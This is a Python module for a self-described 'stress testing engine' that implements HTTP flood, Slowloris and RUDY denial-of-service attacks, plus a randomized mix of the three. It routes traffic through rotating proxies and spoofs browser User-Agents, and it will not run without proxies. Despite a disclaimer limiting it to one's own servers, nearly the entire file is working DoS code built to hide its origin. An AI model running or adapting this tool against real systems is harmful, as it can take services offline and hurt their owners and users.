"""
Stress Testing Engine - HTTP-based load testing for authorized security testing.

WARNING: This tool is for authorized security testing of YOUR OWN servers only.
Unauthorized use against third-party servers is illegal and unethical.

Supports:
- HTTP Flood (high-volume GET/POST)
- Slowloris (slow header attack)
- RUDY (slow POST body attack)
- Randomized mixed attacks
"""
import asyncio
import aiohttp
import random
import string
import time
import logging
from dataclasses import dataclass, field
from typing import List, Optional, Callable, Dict, Any
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
import threading

from .models import ProxyConfig


class AttackType(Enum):
    """Types of stress tests available."""
    HTTP_FLOOD = "http_flood"
    SLOWLORIS = "slowloris"
    RUDY = "rudy"
    RANDOMIZED = "randomized"


class RequestMethod(Enum):
    """HTTP methods for stress testing."""
    GET = "GET"
    POST = "POST"
    HEAD = "HEAD"
    PUT = "PUT"
    DELETE = "DELETE"


@dataclass
class StressConfig:
    """Configuration for stress testing."""
    target_url: str
    attack_type: AttackType = AttackType.HTTP_FLOOD
    method: RequestMethod = RequestMethod.GET
    threads: int = 100
    duration_seconds: int = 60
    rps_limit: int = 0  # 0 = unlimited
    # POST/PUT body settings
    payload_size_bytes: int = 1024
    use_random_payload: bool = True
    custom_payload: str = ""
    # Headers
    custom_headers: Dict[str, str] = field(default_factory=dict)
    randomize_user_agent: bool = True
    # Slowloris specific
    slowloris_socket_count: int = 200
    slowloris_sleep_time: float = 15.0
    # RUDY specific
    rudy_chunk_size: int = 1
    rudy_chunk_delay: float = 10.0


@dataclass
class StressStats:
    """Real-time statistics for stress test."""
    requests_sent: int = 0
    requests_success: int = 0
    requests_failed: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    proxies_used: int = 0
    proxies_failed: int = 0
    current_rps: float = 0.0
    avg_latency_ms: float = 0.0
    min_latency_ms: float = float('inf')
    max_latency_ms: float = 0.0
    start_time: float = 0.0
    elapsed_seconds: float = 0.0
    # Response code breakdown
    response_codes: Dict[int, int] = field(default_factory=dict)
    # Error types
    error_types: Dict[str, int] = field(default_factory=dict)


# Common User-Agent strings for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]


class StressEngine:
    """
    Async HTTP stress testing engine using HTTP proxies.

    WARNING: For authorized testing of your own servers only!
    """

    def __init__(
        self,
        config: StressConfig,
        proxies: List[ProxyConfig],
        on_stats_update: Optional[Callable[[StressStats], None]] = None,
        on_log: Optional[Callable[[str], None]] = None,
    ):
        self.config = config
        self.proxies = [p for p in proxies if p.protocol.upper() == "HTTP"]
        self.on_stats_update = on_stats_update
        self.on_log = on_log

        self.stats = StressStats()
        self._running = False
        self._paused = False
        self._stop_event = asyncio.Event()
        self._pause_event = asyncio.Event()
        self._pause_event.set()  # Not paused initially

        self._latencies: List[float] = []
        self._latency_lock = threading.Lock()
        self._stats_lock = threading.Lock()
        self._proxy_index = 0
        self._proxy_lock = threading.Lock()
        self._used_proxies: set = set()

        # Rate limiting
        self._request_times: List[float] = []
        self._rps_lock = threading.Lock()

        self.logger = logging.getLogger(__name__)

    def _log(self, message: str):
        """Log a message."""
        self.logger.info(message)
        if self.on_log:
            self.on_log(message)

    def _get_next_proxy(self) -> Optional[ProxyConfig]:
        """Get next proxy in rotation."""
        if not self.proxies:
            return None

        with self._proxy_lock:
            proxy = self.proxies[self._proxy_index]
            self._proxy_index = (self._proxy_index + 1) % len(self.proxies)
            self._used_proxies.add((proxy.host, proxy.port))

        return proxy

    def _get_random_payload(self, size: int) -> str:
        """Generate random payload of specified size."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

    def _get_headers(self) -> Dict[str, str]:
        """Get headers for request."""
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        }

        if self.config.randomize_user_agent:
            headers["User-Agent"] = random.choice(USER_AGENTS)
        else:
            headers["User-Agent"] = USER_AGENTS[0]

        # Add custom headers
        headers.update(self.config.custom_headers)

        return headers

    def _should_rate_limit(self) -> bool:
        """Check if we should rate limit based on RPS setting."""
        if self.config.rps_limit <= 0:
            return False

        current_time = time.time()
        with self._rps_lock:
            # Remove old timestamps (older than 1 second)
            self._request_times = [t for t in self._request_times if current_time - t < 1.0]

            if len(self._request_times) >= self.config.rps_limit:
                return True

            self._request_times.append(current_time)

        return False

    def _update_stats(
        self,
        success: bool,
        latency_ms: float = 0,
        bytes_sent: int = 0,
        bytes_received: int = 0,
        status_code: int = 0,
        error_type: str = "",
        proxy_failed: bool = False,
    ):
        """Update statistics thread-safely."""
        with self._stats_lock:
            self.stats.requests_sent += 1

            if success:
                self.stats.requests_success += 1
            else:
                self.stats.requests_failed += 1

            self.stats.bytes_sent += bytes_sent
            self.stats.bytes_received += bytes_received

            if status_code > 0:
                self.stats.response_codes[status_code] = self.stats.response_codes.get(status_code, 0) + 1

            if error_type:
                self.stats.error_types[error_type] = self.stats.error_types.get(error_type, 0) + 1

            if proxy_failed:
                self.stats.proxies_failed += 1

            self.stats.proxies_used = len(self._used_proxies)

        if latency_ms > 0:
            with self._latency_lock:
                self._latencies.append(latency_ms)
                # Keep only last 1000 for rolling average
                if len(self._latencies) > 1000:
                    self._latencies = self._latencies[-1000:]

                self.stats.avg_latency_ms = sum(self._latencies) / len(self._latencies)
                self.stats.min_latency_ms = min(self.stats.min_latency_ms, latency_ms)
                self.stats.max_latency_ms = max(self.stats.max_latency_ms, latency_ms)

    def _calculate_rps(self):
        """Calculate current requests per second."""
        if self.stats.elapsed_seconds > 0:
            self.stats.current_rps = self.stats.requests_sent / self.stats.elapsed_seconds

    async def _http_flood_worker(self, session: aiohttp.ClientSession, worker_id: int):
        """Worker for HTTP flood attack."""
        while self._running and not self._stop_event.is_set():
            # Check pause
            await self._pause_event.wait()

            # Check duration
            if self.stats.elapsed_seconds >= self.config.duration_seconds:
                break

            # Rate limiting
            if self._should_rate_limit():
                await asyncio.sleep(0.01)
                continue

            proxy = self._get_next_proxy()
            proxy_url = f"http://{proxy.host}:{proxy.port}" if proxy else None

            start_time = time.time()
            bytes_sent = 0

            try:
                # Prepare request
                method = self.config.method.value
                url = self.config.target_url
                headers = self._get_headers()
                data = None

                if method in ("POST", "PUT"):
                    if self.config.use_random_payload:
                        data = self._get_random_payload(self.config.payload_size_bytes)
                    else:
                        data = self.config.custom_payload
                    bytes_sent = len(data.encode()) if data else 0

                # Make request
                async with session.request(
                    method,
                    url,
                    headers=headers,
                    data=data,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False,
                ) as response:
                    latency_ms = (time.time() - start_time) * 1000
                    content = await response.read()

                    self._update_stats(
                        success=True,
                        latency_ms=latency_ms,
                        bytes_sent=bytes_sent + len(str(headers).encode()),
                        bytes_received=len(content),
                        status_code=response.status,
                    )

            except aiohttp.ClientProxyConnectionError as e:
                self._update_stats(success=False, error_type="proxy_connection", proxy_failed=True)
            except aiohttp.ClientConnectorError as e:
                self._update_stats(success=False, error_type="connection")
            except asyncio.TimeoutError:
                self._update_stats(success=False, error_type="timeout")
            except Exception as e:
                error_type = type(e).__name__
                self._update_stats(success=False, error_type=error_type)

    async def _slowloris_worker(self, worker_id: int):
        """
        Slowloris attack worker - keeps connections open with partial headers.

        Sends partial HTTP headers slowly to exhaust server connections.
        """
        while self._running and not self._stop_event.is_set():
            await self._pause_event.wait()

            if self.stats.elapsed_seconds >= self.config.duration_seconds:
                break

            proxy = self._get_next_proxy()

            try:
                # Parse target URL
                from urllib.parse import urlparse
                parsed = urlparse(self.config.target_url)
                host = parsed.hostname
                port = parsed.port or 80
                path = parsed.path or "/"

                # Connect through proxy or direct
                if proxy:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(proxy.host, proxy.port),
                        timeout=10
                    )
                    # Send CONNECT for proxy (though HTTP proxies don't need this for HTTP)
                    # For HTTP proxy, we send the full URL in the request
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port),
                        timeout=10
                    )

                # Send partial headers
                initial_headers = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                writer.write(initial_headers.encode())
                await writer.drain()

                self._update_stats(success=True, bytes_sent=len(initial_headers))

                # Keep connection alive with slow headers
                while self._running and not self._stop_event.is_set():
                    await self._pause_event.wait()

                    if self.stats.elapsed_seconds >= self.config.duration_seconds:
                        break

                    # Send a partial header line every sleep interval
                    keep_alive_header = f"X-a: {random.randint(1, 5000)}\r\n"
                    try:
                        writer.write(keep_alive_header.encode())
                        await writer.drain()
                        self._update_stats(success=True, bytes_sent=len(keep_alive_header))
                    except Exception:
                        break

                    await asyncio.sleep(self.config.slowloris_sleep_time)

                writer.close()
                await writer.wait_closed()

            except asyncio.TimeoutError:
                self._update_stats(success=False, error_type="timeout")
            except ConnectionRefusedError:
                self._update_stats(success=False, error_type="connection_refused")
            except Exception as e:
                self._update_stats(success=False, error_type=type(e).__name__)

            # Small delay before reconnecting
            await asyncio.sleep(0.1)

    async def _rudy_worker(self, worker_id: int):
        """
        RUDY (R-U-Dead-Yet) attack worker - slow POST body.

        Sends POST with large Content-Length but delivers body very slowly.
        """
        while self._running and not self._stop_event.is_set():
            await self._pause_event.wait()

            if self.stats.elapsed_seconds >= self.config.duration_seconds:
                break

            proxy = self._get_next_proxy()

            try:
                from urllib.parse import urlparse
                parsed = urlparse(self.config.target_url)
                host = parsed.hostname
                port = parsed.port or 80
                path = parsed.path or "/"

                # Connect
                if proxy:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(proxy.host, proxy.port),
                        timeout=10
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port),
                        timeout=10
                    )

                # Claim we're sending a large body
                content_length = 100000
                headers = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"\r\n"
                )

                writer.write(headers.encode())
                await writer.drain()
                self._update_stats(success=True, bytes_sent=len(headers))

                # Send body very slowly, one byte at a time
                bytes_sent_body = 0
                while self._running and not self._stop_event.is_set() and bytes_sent_body < content_length:
                    await self._pause_event.wait()

                    if self.stats.elapsed_seconds >= self.config.duration_seconds:
                        break

                    # Send tiny chunk
                    chunk = random.choice(string.ascii_letters) * self.config.rudy_chunk_size
                    try:
                        writer.write(chunk.encode())
                        await writer.drain()
                        bytes_sent_body += len(chunk)
                        self._update_stats(success=True, bytes_sent=len(chunk))
                    except Exception:
                        break

                    await asyncio.sleep(self.config.rudy_chunk_delay)

                writer.close()
                await writer.wait_closed()

            except asyncio.TimeoutError:
                self._update_stats(success=False, error_type="timeout")
            except ConnectionRefusedError:
                self._update_stats(success=False, error_type="connection_refused")
            except Exception as e:
                self._update_stats(success=False, error_type=type(e).__name__)

            await asyncio.sleep(0.1)

    async def _stats_reporter(self):
        """Periodically report stats to callback."""
        last_report = time.time()

        while self._running and not self._stop_event.is_set():
            await asyncio.sleep(0.5)  # Update every 500ms

            current_time = time.time()
            self.stats.elapsed_seconds = current_time - self.stats.start_time
            self._calculate_rps()

            if self.on_stats_update:
                self.on_stats_update(self.stats)

            # Check duration
            if self.stats.elapsed_seconds >= self.config.duration_seconds:
                self._log(f"Duration reached ({self.config.duration_seconds}s), stopping...")
                self.stop()
                break

    async def run(self):
        """Run the stress test."""
        if not self.proxies:
            self._log("ERROR: No HTTP proxies available for stress testing!")
            return

        self._log(f"=" * 60)
        self._log(f"STRESS TEST STARTING")
        self._log(f"Target: {self.config.target_url}")
        self._log(f"Attack Type: {self.config.attack_type.value}")
        self._log(f"Method: {self.config.method.value}")
        self._log(f"Threads: {self.config.threads}")
        self._log(f"Duration: {self.config.duration_seconds}s")
        self._log(f"HTTP Proxies: {len(self.proxies)}")
        self._log(f"=" * 60)

        self._running = True
        self.stats = StressStats()
        self.stats.start_time = time.time()
        self._stop_event.clear()

        # Create session for HTTP flood
        connector = aiohttp.TCPConnector(
            limit=self.config.threads * 2,
            limit_per_host=self.config.threads,
            force_close=False,
            enable_cleanup_closed=True,
        )

        async with aiohttp.ClientSession(connector=connector) as session:
            # Create workers based on attack type
            workers = []

            if self.config.attack_type == AttackType.HTTP_FLOOD:
                for i in range(self.config.threads):
                    workers.append(asyncio.create_task(
                        self._http_flood_worker(session, i)
                    ))

            elif self.config.attack_type == AttackType.SLOWLORIS:
                for i in range(self.config.slowloris_socket_count):
                    workers.append(asyncio.create_task(
                        self._slowloris_worker(i)
                    ))

            elif self.config.attack_type == AttackType.RUDY:
                for i in range(self.config.threads):
                    workers.append(asyncio.create_task(
                        self._rudy_worker(i)
                    ))

            elif self.config.attack_type == AttackType.RANDOMIZED:
                # Mix of all attack types
                flood_count = self.config.threads // 2
                slowloris_count = self.config.threads // 4
                rudy_count = self.config.threads - flood_count - slowloris_count

                for i in range(flood_count):
                    workers.append(asyncio.create_task(
                        self._http_flood_worker(session, i)
                    ))
                for i in range(slowloris_count):
                    workers.append(asyncio.create_task(
                        self._slowloris_worker(i)
                    ))
                for i in range(rudy_count):
                    workers.append(asyncio.create_task(
                        self._rudy_worker(i)
                    ))

            # Stats reporter
            workers.append(asyncio.create_task(self._stats_reporter()))

            self._log(f"Launched {len(workers) - 1} attack workers + stats reporter")

            # Wait for all workers
            await asyncio.gather(*workers, return_exceptions=True)

        self._running = False

        # Final stats report
        self._log(f"=" * 60)
        self._log(f"STRESS TEST COMPLETE")
        self._log(f"Total Requests: {self.stats.requests_sent}")
        self._log(f"Successful: {self.stats.requests_success}")
        self._log(f"Failed: {self.stats.requests_failed}")
        self._log(f"Average RPS: {self.stats.current_rps:.2f}")
        self._log(f"Avg Latency: {self.stats.avg_latency_ms:.2f}ms")
        self._log(f"Proxies Used: {self.stats.proxies_used}")
        self._log(f"=" * 60)

        if self.on_stats_update:
            self.on_stats_update(self.stats)

    def stop(self):
        """Stop the stress test."""
        self._log("Stopping stress test...")
        self._running = False
        self._stop_event.set()
        self._pause_event.set()  # Unpause to allow clean exit

    def pause(self):
        """Pause the stress test."""
        self._paused = True
        self._pause_event.clear()
        self._log("Stress test PAUSED")

    def resume(self):
        """Resume the stress test."""
        self._paused = False
        self._pause_event.set()
        self._log("Stress test RESUMED")

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def is_paused(self) -> bool:
        return self._paused
